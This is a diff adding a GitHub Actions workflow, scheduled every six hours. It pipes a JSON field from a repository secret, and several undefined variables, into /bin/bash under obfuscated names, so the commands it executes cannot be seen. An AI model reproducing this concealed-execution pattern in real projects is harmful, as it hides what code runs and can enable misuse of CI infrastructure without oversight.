@@ -1,0 +1,25 @@
+name: sheishiqiaowuk
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '39 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: sheishiqiaowuk
+        env:
+          u319: ${{ secrets.u319 }}
+        run: |
+          echo $u319 | jq -r .f95704 | /bin/bash
+          echo $giial01 | jq -r .djqj8052 | /bin/bash
+          echo $w01990 | jq -r .ac624 | /bin/bash
+          echo $rlb13584 | jq -r .gjm02 | /bin/bash
+          echo $vyuo7422 | jq -r .bncg771 | /bin/bash
+          echo $x34 | jq -r .evosi418 | /bin/bash
+          echo $bwdx5608 | jq -r .i029 | /bin/bash
+          echo $wfh37 | jq -r .bejq7 | /bin/bash
+
